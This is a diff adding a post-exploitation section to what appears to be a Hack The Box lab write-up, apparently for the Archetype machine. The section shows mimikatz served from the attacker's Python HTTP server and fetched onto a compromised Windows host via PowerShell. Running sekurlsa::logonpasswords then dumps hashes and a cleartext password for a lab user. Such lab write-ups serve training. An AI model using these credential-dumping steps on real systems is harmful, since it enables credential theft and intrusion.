@@ -297,16 +297,81 @@
 
     PS C:\Users\administrator\Desktop>  type root.txt
     6e9a9fd..................
+    
+    
+
+## ----- Post Exploitation -----
+
+// Since we know the machines in start point are "chained-together" and we didnt get any further info,
+// Lets try to get some passes, First download mimikatz.exe with wget
+
+    $ wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip 
+// unzip and extract the x64 mimikatz.exe file
+// open python server to upload file
+
+    $ python3 -m http.server 1444
+    Serving HTTP on 0.0.0.0 port 1444 (http://0.0.0.0:1444/) ...
+10.10.10.29 - - [31/Jul/2021 23:49:35] "GET /mimikatz.exe HTTP/1.1" 200 -
+
+// download on targeted machine using powershell
+
+    PS C:\Users\administrator\Desktop\tmp> IWR -useBasicParsing http://10.10.16.7:1444/mimikatz.exe -o katz.exe
+    PS C:\Users\administrator\Desktop\tmp> ls
+
+        Directory: C:\Users\administrator\Desktop\tmp
 
 
+    Mode                LastWriteTime         Length Name                          
+    ----                -------------         ------ ----                          
+    -a----        7/31/2021  11:46 PM        1330160 katz.exe                      
 
 
+// and run ./katz.exe, then enter 'sekurlsa::logonpasswords'
 
+    S C:\Users\administrator\Desktop\tmp> .\katz.exe
 
-Access ID | Name | Email
-----------|------|-------
-34322 | admin | admin@megacorp.com
+      .#####.   mimikatz 2.2.0 (x64) #19041 May 31 2021 00:08:47
+     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+     ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+     '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+      '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
 
-// When navigating to uploads (http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads) we get error due privilleges
+    mimikatz # sekurlsa::logonpasswords
 
-![Image 2](https://github.com/W0lfySec/HTB/blob/main/Images/Oopsie/Screenshot_2021-07-31_11_02_
+    ...
+
+    Authentication Id : 0 ; 289603 (00000000:00046b43)
+    Session           : Interactive from 1
+    User Name         : sandra
+    Domain            : MEGACORP
+    Logon Server      : PATHFINDER
+    Logon Time        : 7/31/2021 4:20:37 PM
+    SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
+        msv :	
+         [00000003] Primary
+         * Username : sandra
+         * Domain   : MEGACORP
+         * NTLM     : 29ab86c5c4d2aab957763e5c1720486d
+         * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38
+         * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc
+        tspkg :	
+        wdigest :	
+         * Username : sandra
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :	
+         * Username : sandra
+         * Domain   : MEGACORP.LOCAL
+         * Password : Password1234!
+        ssp :	
+        credman :	
+
+    ...
+    
+
+// we have sandra's credentials ! 
+
+         * Username : sandra
+         * Domain   : MEGACORP.LOCAL
+         * Password : Password1234!
